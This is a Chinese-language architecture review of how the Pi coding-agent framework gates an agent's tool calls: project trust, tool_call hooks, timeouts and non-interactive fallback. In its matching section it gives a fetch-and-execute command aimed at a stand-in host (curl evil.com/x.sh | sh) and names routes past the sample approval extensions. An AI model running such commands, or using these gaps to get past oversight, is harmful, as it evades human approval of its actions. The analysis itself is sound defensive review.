## 定位

预判已被证实：**Pi 框架内核本身不做工具调用级别的审批**。框架原生只有一层与"权限"相关的机制——project trust（项目信任），它的作用是决定要不要加载项目本地的配置/扩展/技能/系统提示文件，明文声明"不是沙箱，不限制模型能让工具做什么"（`docs/security.md:7`）。真正拦截"这次工具调用能不能执行"的能力，框架只提供一个可插拔的 `tool_call` hook，默认不挂任何逻辑——没有装审批类扩展的 Pi，bash/write/edit 全部无审批直接执行。`examples/extensions/permission-gate.ts` 位于 `examples/` 目录不是偶然：官方把"要不要审批、审批什么、审批到什么粒度"整体定义为扩展作者的责任，框架只负责把原语递出去。

## 架构

```
project trust (会话启动阶段，只发生一次)
  cwd --> hasTrustRequiringProjectResources()
      --> resolveProjectTrusted() [src/core/project-trust.ts:46]
          --> user/global 或 CLI -e 扩展的 project_trust 事件优先决定
          --> 否则查 trust.json 已保存决定
          --> 否则按 defaultProjectTrust("ask"/"always"/"never") 走
          --> "ask" 且有 UI 时弹 TrustSelector
      --> 决定是否加载 .pi/settings.json、.pi/extensions、.pi/skills、
          .pi/prompts、.pi/themes、SYSTEM.md/APPEND_SYSTEM.md

tool_call 拦截链 (每次工具调用都会走一遍)
  LLM 决定调用工具
    --> pi-agent-core: agent-loop.ts prepareToolCall()
        --> try {
              config.beforeToolCall(...)   [挂载点]
                --> AgentSession._installAgentToolHooks 装的回调
                    [src/core/agent-session.ts:469]
                    --> runner.hasHandlers("tool_call")?
                        否 --> 直接放行，不经过任何扩展
                        是 --> ExtensionRunner.emitToolCall()
                                [src/core/extensions/runner.ts:919]
                                --> 依次调用各扩展的 tool_call handler
                                --> 任一 handler 返回 block:true 立即短路返回
                                --> handler 可原地 mutate event.input
            } catch (err) { 视为 block，转成 isError 工具结果 }
        --> block? 合成 isError 工具结果，交回给 LLM
        --> 否则执行真实工具 --> afterToolCall --> tool_result hook
            (同样经 ExtensionRunner，可改写结果，不能新增"再次确认")
```

两条链路互不相通：project trust 只在会话/进程启动阶段跑一次，只影响"要不要装载资源"；`tool_call` hook 在每次工具调用时跑，只影响"这次调用要不要执行"。框架没有把两者接在一起（即便项目不受信任，已加载的用户/全局扩展依然可以对工具调用为所欲为——project trust 挡的是"加载"，不是"执行"）。

## 框架暴露给扩展层的原语

这是本报告的重心。框架不提供任何"审批策略"，但提供以下原语，扩展作者用这些原语自行拼出审批系统：

1. **`tool_call` 事件（可阻断）** — `src/core/extensions/types.ts:847-906`
   - 拿得到：`toolCallId`、`toolName`（内置工具字面量类型，自定义工具是 `string`）、`input`（该工具本次调用的完整参数对象，**可变**）。
   - `event.input` 原地 mutate 即可改写即将执行的参数；后续 handler 看到的是被前一个 handler 改过的值；改写后**不会重新校验**（`types.ts:892-896`，`docs/extensions.md:759-764`）。
   - `ctx: ExtensionContext` 同时给到：`hasUI`、`mode`（"tui"/"rpc"/"json"/"print"）、`cwd`、只读的 `sessionManager`（可读当前会话到目前为止的完整消息/entries）、`model`、`isProjectTrusted()`、`signal`、`abort()` 等（`types.ts:306-341`）。
   - 返回契约极薄：`ToolCallEventResult = { block?: boolean; reason?: string }`（`types.ts:1065-1069`）。**没有**"改写参数"这个返回字段——改参数必须靠原地 mutate；也没有"记住这个决定"的返回字段。
   - 多 handler 语义由框架固定：按 `this.extensions` 数组顺序遍历，一旦某个 handler 返回 `block:true` 立即 `return`，不再跑后面的扩展（`runner.ts:919-940`）。

2. **`tool_result` 事件（可改写结果，不能新增审批）** — `types.ts:908-967`，`docs/extensions.md:814-847`
   - 拿到执行后的 `content`/`details`/`isError`/`usage`，可返回部分补丁（未返回字段保留原值），多个 handler 按 load order 链式叠加。此钩子发生在工具已经执行完之后，无法用来"事后拦截"。

3. **交互式提问原语（`ctx.ui`）** — `types.ts:130-281`
   - `select(title, options, opts?)`、`confirm(title, message, opts?)`、`input(title, placeholder?, opts?)`、`editor(title, prefill?)`：都返回 `Promise`，都支持 `{ signal?, timeout? }`。
   - `timeout` 会在 TUI 里显示倒计时并自动 dismiss；超时返回值固定：`select`→`undefined`，`confirm`→`false`，`input`→`undefined`（`docs/extensions.md:2474-2496`）。是否设置 timeout 完全由扩展决定，框架不强制默认超时。
   - `hasUI=false` 时（JSON/print 模式），这些方法被替换为 `noOpUIContext`：`select`/`input` 立即返回 `undefined`，`confirm` 立即返回 `false`，同步返回、不会挂起（`runner.ts:233-263`）。这是框架给的"默认拒绝倾向"，但仅仅是原语的默认值——扩展如果不检查 `hasUI` 直接调用这些方法并信任其返回语义，理论上能拿到一个安全的默认拒答；但框架并不强制扩展这样写（`permission-gate.ts:20-23` 就是自己显式判断 `ctx.hasUI`，而不是依赖 `confirm()` 的默认值）。

4. **持久化原语：`pi.appendEntry(customType, data?)`** — `types.ts:1294-1295`，`docs/extensions.md:15, 1437-1454`
   - 唯一的框架级"扩展状态持久化"通道，把一条自定义 entry 写进**当前 session 的 JSONL 文件**，不参与 LLM 上下文。
   - 读回方式：`ctx.sessionManager.getEntries()`（只读），扩展需要在 `session_start` 事件里自己扫描历史 entries、手动重建内存状态（`examples/extensions/plan-mode/index.ts:340-389` 是官方给出的重建范式）。
   - **框架没有提供任何跨 session / 跨项目 / 跨设备的扩展专属存储 API**。`docs/extensions.md` 的 "State Management" 一节（`1819-1827`）明确把状态管理的落点限定在 session entries 和工具结果的 `details` 字段。扩展若想做"批准一次、记住这一类、跨会话生效"，必须自己用 Node 的 `fs` 读写文件——这是可以做的（扩展与主进程同权限，`docs/security.md:33`），但没有框架背书的默认路径、默认 schema、默认加锁方式。

5. **工具面控制原语**：`getActiveTools()`/`setActiveTools()`/`getAllTools()`（`types.ts:1313-1320`）——粒度是"整个工具是否启用"，不是"某次调用是否放行"。`plan-mode` 用它做"进入 plan 模式就把 `edit`/`write` 整体摘掉"这种粗粒度开关（`plan-mode/index.ts:104-114`），不是审批。

6. **框架自带的两处 fail-safe 兜底**（这是框架代码而非扩展代码的行为）：
   - `tool_call` handler 抛异常：`ExtensionRunner.emitToolCall` 本身不 catch，异常经 `AgentSession._installAgentToolHooks` 包装后原样上抛（`agent-session.ts:482-487`），最终在 `pi-agent-core` 的 `prepareToolCall()` 里被 `try/catch` 兜住，转成 `isError:true` 的工具结果返回给模型（`packages/agent/src/agent-loop.ts` 第 599-663 行附近，`try { ... beforeToolCall ... } catch (error) { return { kind: "immediate", result: createErrorToolResult(...), isError: true } }`）。`docs/extensions.md:2863` 把这个行为明文写成"`tool_call` errors block the tool (fail-safe)"。
   - `ctx.signal.aborted`（用户按 Esc）：在 `beforeToolCall` 前后都会被检查，命中则直接把这次调用标记为 `Operation aborted` 的 isError 结果（`agent-loop.ts` 同一段）。

## 八切面

### 1 拦截点

- 唯一的运行期拦截点是 `pi-agent-core` 的 `Agent.beforeToolCall`/`afterToolCall` 回调，由 `AgentSession._installAgentToolHooks` 接到 `ExtensionRunner.emitToolCall`/`emitToolResult`。`[读到]` `packages/coding-agent/src/core/agent-session.ts:468-518`
- 若没有任何扩展注册 `tool_call` handler，`runner.hasHandlers("tool_call")` 为 `false`，钩子直接 `return undefined`，完全不经过任何检查——框架默认状态是"零拦截"。`[读到]` `packages/coding-agent/src/core/agent-session.ts:469-473`
- 拦的是"工具名 + 本次调用的完整参数对象"，不是仅工具名：`event.input` 是具体的 `command`/`path`/文件内容等（`bash` 工具示例见 `docs/extensions.md:776-778`，直接读取并改写 `event.input.command`）。`[读到]` `packages/coding-agent/src/core/extensions/types.ts:847-906`
- 谁不信任谁：框架不预设"要不要信任某次具体工具调用"（这层完全空白，等扩展填），但信任"已被加载进程内的扩展代码"——扩展与主进程同权限运行，不在这层被限制（`docs/security.md:33`）。项目本地资源（`.pi/extensions` 等）本身是否被允许加载，由单独一层 project trust 在会话启动阶段决定，且项目本地扩展**不能**参与自己的信任判定（只有 user/global 或 CLI `-e` 扩展能处理 `project_trust` 事件），这是"框架不信任项目自证清白"的设计。`[读到]` `packages/coding-agent/docs/security.md:27`
- 代价：裸装 Pi、不装任何审批类扩展时，bash/write/edit 全部无审批直接执行——这不是配置缺失，是文档写明的默认状态（`docs/security.md:31-37`）。产品如果假设"Pi 天然会在危险操作前问一句"，这个假设是错的。

### 2 决策单元

- 扩展层（`tool_call` hook）：一次 handler 调用对应一次具体 `toolCallId`。要不要把这次同意扩大成"这一类"，完全靠扩展自己写判断逻辑（`permission-gate.ts` 用 3 条正则识别"危险命令"；`plan-mode/utils.ts` 用两组正则做 allowlist/denylist）。框架不提供任何"记住这个工具/这个参数模式/这个资源前缀"的内置决策单元。`[读到]` `packages/coding-agent/src/core/extensions/types.ts:1065-1069`（`ToolCallEventResult` 只有 `block`/`reason` 两个字段，没有"记住"相关字段）
- 框架原生唯一的决策单元是 project trust，单位是"目录路径"（canonicalize 后的绝对路径），不区分工具/命令/资源类型。默认选中的选项是 "Trust"（只信任当前目录），额外提供 "Trust parent folder" 选项可以把单元从当前目录升级为父目录（通过 nearest-ancestor 查找隐式覆盖所有子目录）。`[读到]` `packages/coding-agent/src/core/trust-manager.ts:65-95`（`getProjectTrustOptions`）、`43-57`（`findNearestTrustEntry`）
- 用户能否升降级：能。交互模式里 `/trust` 命令重新打开选择器可以改选（`Trust`/`Trust parent folder`/`Do not trust`，含"仅本次会话"两个不落盘的选项）；CLI 级别用 `--approve`/`-a`、`--no-approve`/`-na` 做单次运行覆盖，不写回 `trust.json`。`[读到]` `packages/coding-agent/src/modes/interactive/interactive-mode.ts:2719-2723`；`packages/coding-agent/src/cli/args.ts:180-183`；`packages/coding-agent/src/core/project-trust.ts:46-49`
- 代价：project trust 的决策单元和"工具执行权限"完全不是同一件事——用户批准的是"允许加载该目录下的配置/扩展/技能"，不是"允许该目录下的操作免审批执行"。把这层心智模型套到"工具执行白名单"上会产生错误的安全预期（`docs/security.md:7, 37` 反复强调这一点）。

### 3 生命周期

- project trust：写入 `trust.json` 后即持久，未见任何过期字段或 TTL 逻辑；唯一改变方式是用户再次交互修改或手工改文件。`[读到]`（`trust-manager.ts` 全文的 `TrustFile` 类型只有 `path -> boolean|null`，无时间戳字段）
- "本次会话内信任"（session-only 选项）：`updates: []`，不写入 `trust.json`，进程退出即丢。`[读到]` `packages/coding-agent/src/core/trust-manager.ts:83, 92`
- 扩展自身的 `tool_call` 判定状态（如 plan-mode 的 `enabled`/`executing`）默认只活在内存里；要跨越"关闭再打开同一个 session"存活，必须扩展自己在每次状态变化时调用 `pi.appendEntry`，并在 `session_start` 事件里手动扫描历史 entries 重建（`plan-mode/index.ts:116-123` 写入，`340-389` 重建）。这是扩展责任，框架只给读写原语，不提供自动恢复。`[读到]`
- resume 同一个 session 文件：`appendEntry` 状态保留（因为 `getEntries()` 就是重放同一份 JSONL）。新开一个 session（`/new`）：会生成新的 session 文件，之前 `appendEntry` 写入的状态不会自动带过来，除非扩展自己另外实现跨 session 存储。`[推断]`：由 `session-manager.ts` 中 `SessionManager.create()` 为新会话分配新目录/文件、`appendEntry` 只写当前 `SessionManager` 实例对应文件这一事实推出，未直接构造一个"新建 session 后读旧状态"的场景做实测。
- 换设备：`trust.json` 和 session 目录都落在本地 `~/.pi/agent` 下（或 `$PI_CODING_AGENT_DIR`），不做任何跨机同步；换设备等于两层状态全部归零，除非用户手动搬运整个 `~/.pi/agent` 目录（容器化文档里专门提示"挂载 host 的 `~/.pi/agent` 会带过 host 的 auth/session/trust"）。`[读到]` `packages/coding-agent/src/config.ts:514-521`；`packages/coding-agent/docs/containerization.md:48, 77`
- 代价：没有"过期"概念意味着一次 Trust 决定是永久性的，直到用户手动修改；如果威胁模型改变（比如某仓库后来被投毒），旧的信任不会自动失效或提醒复核。

### 4 持久化与作用域

- project trust 存 `~/.pi/agent/trust.json`（或 `$PI_CODING_AGENT_DIR/trust.json`），纯 JSON 对象，key 是 canonicalize 后的目录绝对路径，value 是 `true`/`false`/`null`（`null` 代表"删除该条目，交由更上层目录的记录接管"）。`[读到]` `packages/coding-agent/src/core/trust-manager.ts:27, 208-244`；`packages/coding-agent/src/config.ts:514-521`
- 索引 key 只由"目录路径"构成，不区分资源类型——同一路径下无论是要加载 `.pi/extensions` 还是 `.pi/skills`，共用同一条布尔决定（资源类型列表见 `trust-manager.ts:29-37`，但信任判定本身与资源类型无关）。`[读到]`
- 作用域：`trust.json` 是"整机全局"的，按目录路径隔离项目，不跨设备、不跨用户账号同步。真正会"跨会话/跨项目共享"的东西是 project trust；"扩展的工具调用审批记忆"则完全没有共享通道，因为框架根本没为这类数据设计存储位置——只有 session-scoped 的 `appendEntry`。`[读到 + 推断]`
- 冷启动重建：`trust.json` 缺失或该目录无记录时，走 `defaultProjectTrust`（`"ask"`/`"always"`/`"never"`，全局 setting，默认 `"ask"`）。`trust.json` 内容非法（不是纯对象，或某个 value 不是 `true`/`false`/`null`）时直接 `throw Error`，不是静默忽略或退回默认值。`[读到]` `packages/coding-agent/src/core/project-trust.ts:72-96`；`packages/coding-agent/src/core/settings-manager.ts:62, 899-906`；`packages/coding-agent/src/core/trust-manager.ts:110-121`
- 代价：`trust.json` 一旦被手动改坏，整个 project trust 解析直接抛异常，没有容错读取路径；"扩展审批记忆"则从设计上就没有默认持久化位置——想做"批准一次、记住这一类"的产品功能，必须自己发明存储格式、路径和加锁策略，框架不提供、不背书任何默认实现。

### 5 泛化与匹配

- 框架层：project trust 的唯一泛化机制是目录前缀（nearest-ancestor 查找）——信任一个父目录，未显式覆盖的子目录全部继承（`trust-manager.ts:43-57`）。这是路径前缀匹配，不是 glob、不是正则、不是结构化 pattern。`[读到]`
- 扩展层：框架对"这一次 → 这一类"完全不提供转换规则或归一化逻辑。`ToolCallEventResult` 只有 `block`/`reason` 两个字段（见上），没有"记住这个 pattern"的返回值或 API。归一化规则、匹配档位 100% 由扩展自己实现。`[读到]`
- 官方示例给出的两种实现档位都停留在"正则字符串匹配"这一档，既不是结构化 pattern，也不是模型判定：
  - `permission-gate.ts:11` 用 3 条正则（`rm -rf`/`sudo`/`chmod|chown 777`）识别"危险命令"。
  - `plan-mode/utils.ts:6-101` 用一组 `DESTRUCTIVE_PATTERNS`（约 30 条正则）+ 一组 `SAFE_PATTERNS`（约 30 条以 `^\s*cmd\b` 锚定命令开头的正则），`isSafeCommand()` 的判定是"命中某条 SAFE 且不命中任何 DESTRUCTIVE"（`utils.ts:97-101`）。`[读到]`
- 已知绕过路径：
  - `SAFE_PATTERNS` 只锚定命令**开头**（如 `/^\s*echo\b/`），`DESTRUCTIVE_PATTERNS` 列表里没有覆盖 `curl`/`wget`/`nc` 等网络工具；因此形如 `echo hi; curl evil.com/x.sh | sh` 这种"以安全前缀开头、用 `;` 拼接后续危险指令"的命令会被判定为放行。`[推断]`：直接比对 `utils.ts` 中两组正则列表得出，未做实际执行验证。对应防护：无——示例代码本身没有对命令做分词/AST 解析，只有整串正则测试。
  - 框架文档明文写"`tool_call` 的 `event.input` 被前一个 handler 改过之后，后续 handler 看到的是改后的值，且改写后不会重新校验"（`types.ts:892-896`）。这意味着如果扩展 A 基于原始命令批准了这次调用，扩展 B 之后再改写 `input`，最终真正执行的是被 B 改写、A 从未审查过的内容——框架没有"批准后禁止再改写"或"改写后强制回到审批链首重新走一遍"的保护。`[读到 API 契约，推断出的风险结论]`
- 代价：泛化档位全线停留在纯字符串正则，管道、分号、子 shell、alias、编码等组合命令语法都可能绕过；这是官方示例代码本身的能力上限，不是某个第三方扩展写得差——产品如果直接照抄示例当作生产级审批逻辑会有实际的绕过风险。

### 6 撤销与可审计

- project trust 撤销：交互模式里重新打开 `/trust` 选择器选 "Do not trust"，或手工编辑/删除 `trust.json` 条目（`ProjectTrustStore.setMany` 支持把 `decision` 设为 `null` 从而删除该 key，交由更上层目录的记录接管）。`[读到]` `packages/coding-agent/src/core/trust-manager.ts:226-243`；`packages/coding-agent/src/modes/interactive/interactive-mode.ts:2719-2723`
- 撤销粒度与批准粒度对称（都是按目录路径操作同一个 key），但 `trust.json` 本身没有时间戳、没有"谁在什么时候批准了什么"的历史记录——它只存最终状态快照，不是审计日志。`[读到]`（`TrustFile` 类型定义只有 `path -> boolean|null`，`trust-manager.ts:27`）
- 扩展层的"审批"完全没有框架级撤销通道：如果扩展把批准状态写进 `appendEntry` 或自己的文件，撤销就得靠该扩展自己实现的命令/UI，框架不提供统一的"查看/撤销扩展审批记录"入口。`[推断]`：基于框架未暴露任何跨扩展的存储/撤销 API 这一事实。
- 用户能否查看累计批准了什么：project trust 层面可以——`trust.json` 是可读的纯 JSON 文件，`/trust` UI 里也会展示 "Saved decision" 当前状态（`trust-selector.ts:61`）。扩展层面无法通过框架统一查看，取决于每个扩展有没有自己做展示命令。`[读到 + 推断]`
- 代价：`trust.json` 没有历史/审计维度，出问题后无法回答"这条信任是什么时候、因为什么加上的"；扩展层则连"看"这个能力框架都没给，可审计性完全下放给每个扩展作者自行实现。

### 7 审批 UX

- 唯一框架原生的审批式 UI 是 project trust 选择器：标题固定为 `"Trust project folder?\n{cwd}\n\nThis allows pi to load .pi settings and resources, install missing project packages, and execute project extensions."`；选项集合是 `["Trust", "Trust parent folder (…)"（若有父目录）, "Do not trust"]`，非交互触发时（首次 ask）不含 session-only 选项，`/trust` 手动打开时额外含两个 "(this session only)" 不落盘选项。`[读到]` `packages/coding-agent/src/core/project-trust.ts:24-38`；`packages/coding-agent/src/core/trust-manager.ts:65-95`
- 默认选中项：选择器在 `trust-selector.ts` 里用 `isSavedOption` 查找与已保存决定匹配的选项作为默认高亮；若从无保存记录，`findIndex` 返回 `-1`。`-1` 时组件具体渲染成"无高亮"还是"回退到第一项"未继续深挖到底层可选组件实现。`[读到主逻辑，细节未查]`
- 超时行为：project trust 选择器本身未见 timeout 逻辑——用户不选就一直挂起。扩展层 `ctx.ui.select`/`confirm` 支持可选 `timeout`，超时后自动 dismiss，`select`→`undefined`，`confirm`→`false`，TUI 里显示倒计时（`"Title (5s)"` 递减）。是否设置超时完全是扩展作者的选择，框架不强制默认超时。`[读到]` `packages/coding-agent/docs/extensions.md:2474-2496`
- 批量审批：框架没有提供"合并多个待审批项到一个对话框"的机制；`ExtensionRunner.emitToolCall` 是逐个 `toolCallId` 调一次 handler（`runner.ts:919-940`），要做批量呈现得扩展自己在 handler 内部收集状态、手动弹自定义窗口（框架给了 `ctx.ui.custom()` 这个更底层的原语，可以拿来拼批量 UI，但没有现成实现）。`[读到 + 推断]`
- 提示里展示的信息：project trust 提示只有 cwd 路径和一段固定说明文字，不展示具体会加载哪些文件、扩展来源、文件 diff 等细节。扩展层展示什么完全由扩展自己决定——`permission-gate.ts:25` 的示例把具体命令字符串直接嵌进提示文本里。`[读到]`
- 代价：project trust 的提示信息量很薄（只有一个路径），用户在做信任判断时缺乏"这个目录到底会加载什么、这些扩展会做什么"的依据；扩展层 UX 完全不统一，不同扩展的审批弹窗长相、信息密度、默认行为互不一致，没有平台级规范。

### 8 无人值守降级

- 非交互模式矩阵（官方文档表格，逐字确认）：`[读到]` `packages/coding-agent/docs/extensions.md:2866-2876`

  | 模式 | `ctx.mode` | `ctx.hasUI` | 说明 |
  |---|---|---|---|
  | Interactive | `"tui"` | `true` | 完整 TUI |
  | RPC (`--mode rpc`) | `"rpc"` | `true` | 对话框/通知经 JSON 协议转发给外部客户端；`custom()` 恒返回 `undefined` |
  | JSON (`--mode json`) | `"json"` | `false` | UI 方法全部 no-op |
  | Print (`-p`) | `"print"` | `false` | 扩展仍运行，但无法弹窗 |

- `hasUI=false` 时框架给的默认原语行为（`noOpUIContext`）：`select()`→`undefined`，`confirm()`→`false`，`input()`→`undefined`，`setTheme()`→`{success:false, error:"UI not available"}`。即框架把"无 UI 时的默认动作"钉死为"拒绝/空"，而不是"放行"。`[读到]` `packages/coding-agent/src/core/extensions/runner.ts:233-263`
- 但这只是原语默认值，不是策略强制：真正决定要不要拦截的仍是扩展代码。`permission-gate.ts:20-23` 显式检查 `ctx.hasUI`，无 UI 时直接 `return {block:true, ...}`，压根不调用 `confirm()`；这是"写得好"的示例做法。如果一个扩展偷懒直接调用 `confirm()` 而不检查 `hasUI`，恰好因为无 UI 时 `confirm()` 默认返回 `false` 而"意外地"安全；但如果换成用 `select()` 并对返回值做了不严谨的真值判断（例如把 `undefined` 当成"未选第二项即默认同意"），无 UI 环境反而可能放行。`[推断]`：基于 API 契约本身的类型宽松性推出，未发现库内真实存在这类 bug。
- RPC 模式的应答方：`ctx.ui.select`/`confirm` 通过 `createDialogPromise` 把请求序列化为 `extension_ui_request` 事件写到 stdout，等待外部进程通过 `extension_ui_response` 应答；若不设置 `timeout`/`signal`，Promise 无限期挂起，直到 RPC 客户端应答或流中断。`[读到]` `packages/coding-agent/src/modes/rpc/rpc-mode.ts:90-166`；`packages/coding-agent/src/modes/rpc/rpc-types.ts:239-282`。也就是说 RPC 模式不是真正的"无人值守"，而是把审批权转交给了驱动 Pi 的外部程序/人，谁在消费这个协议、如何应答不在本仓库范围内。`[未查]`：RPC 客户端侧的具体实现（`rpc-client.ts` 提供了客户端封装，但具体消费者/应答策略取决于集成方，本次未追踪到一个真实的自动应答实现）。
- 预授权机制：框架唯一的预授权原语是 `--approve`/`-a`（本次运行内把 project trust 直接判定为 `true`，跳过一切选择器与 `trust.json` 查询）和 `--no-approve`/`-na`（反向）。这两个 flag 只作用于 project trust，不作用于 `tool_call` 层面的审批逻辑——没有等价的"全局自动放行工具调用"开关。`[读到]` `packages/coding-agent/src/cli/args.ts:180-183, 274-275`；`packages/coding-agent/src/core/project-trust.ts:46-49`
- fail-safe 朝哪边倒：project trust 在 `defaultProjectTrust="ask"` 且无 UI 时直接 `return false`——不信任、不加载（`project-trust.ts:86-88`）。`tool_call` 层面，扩展 handler 抛异常会被 `pi-agent-core` 的 `prepareToolCall()` 捕获并转成 `isError` 工具结果，即"异常 = 拒绝执行"而不是"异常 = 放行"（`docs/extensions.md:2863` 明文写为 fail-safe 设计）。整体基调偏向拒绝，但这个基调**只覆盖框架自己的两处逻辑**（trust 解析兜底 + 异常兜底），不覆盖扩展自己写的业务判断——"这算不算危险"判断错了，框架不会介入纠正。`[读到]`
- 代价：框架级 fail-safe 只保证"崩了就拒绝""没 UI 就返回拒绝语义的默认值"，但真正的判断逻辑（什么算危险、要不要问、问谁）100% 在扩展代码里；一个没写好的自定义扩展完全可以在无 UI 环境里静默放行本该拦截的操作，框架不会、也没有能力介入纠正。

## 时序

project trust（每个 cwd 每进程/每次决策至多问一次，除非显式 `/trust` 重开）：

```
用户在 cwd 下启动 pi
  |
  v
hasTrustRequiringProjectResources(cwd)？ --no--> 视为已信任，继续
  |yes
  v
--approve/-a 或 --no-approve/-na 传了？ --yes--> 用该值，不查 trust.json，不弹窗
  |no
  v
user/global 或 CLI -e 扩展的 project_trust handler 给出 yes/no？ --yes--> 用该值
  (remember:true 才写 trust.json；否则只对本进程生效)         |no
  v
trust.json 里有该目录或其祖先目录的已保存决定？ --yes--> 用该值
  |no
  v
defaultProjectTrust:
  "always" --> true
  "never"  --> false
  "ask" 且无 UI（-p / --mode json）--> false
  "ask" 且有 UI --> 弹 TrustSelector，用户选
      -> "Trust" / "Trust parent folder" / "Do not trust"
      -> 写入 trust.json（会话专属选项则不写）
```

`tool_call` 拦截（每次工具调用都走一遍）：

```
LLM 产出一次工具调用 (toolName, toolCallId, args)
  |
  v
runner.hasHandlers("tool_call")? --no--> 直接执行工具
  |yes
  v
依次调用各扩展的 tool_call handler（按扩展加载顺序）
  handler 可以：
   - 原地 mutate event.input（后续 handler 与最终执行都看到改后的值）
   - 调 ctx.ui.confirm/select 等待人工作答（TUI 阻塞等待 / RPC 转发给外部客户端 /
     无 UI 时同步返回 false|undefined）
   - 返回 {block:true, reason} --> 立即短路，跳过后续 handler
   - 抛异常 --> 上层 catch，等价于 block
  |
  v
block? --yes--> 合成 isError 工具结果直接回给 LLM，工具从未真正执行
  |no
  v
执行真实工具 --> afterToolCall --> tool_result hook 链（可改写结果，不能追加审批）
  --> 结果回给 LLM
```

## 明确不做什么

- 不做工具调用级别的默认审批：没有扩展介入时，bash/write/edit 全部无审批直接执行（`docs/security.md:31-37`）。
- 不提供内置沙箱：project trust 只是"输入加载"防线，不限制模型能让工具做什么（`docs/security.md:7`）；真正的隔离要靠容器/微虚拟机等操作系统级手段（`docs/containerization.md`）。
- 不提供审批"记忆到一类"的存储与匹配引擎：`ToolCallEventResult` 只有 `block`/`reason`，没有任何"记住这个 pattern"的返回值或专用 API；泛化逻辑、匹配算法、存储位置全部留给扩展自己实现。
- 不提供跨会话/跨项目/跨设备共享的扩展审批状态：唯一持久化原语 `pi.appendEntry` 是 session-scoped 的；跨会话记忆需要扩展自己另造存储。
- 不提供统一的审批审计日志：project trust 只存最终状态快照（无时间戳/历史），扩展层则完全没有框架级的可视化或撤销通道。
- project trust 不等于运行时工具执行权限：这是两个不同的门，前者门"加载"，后者（如果存在的话）门"执行"，且后者默认不存在。
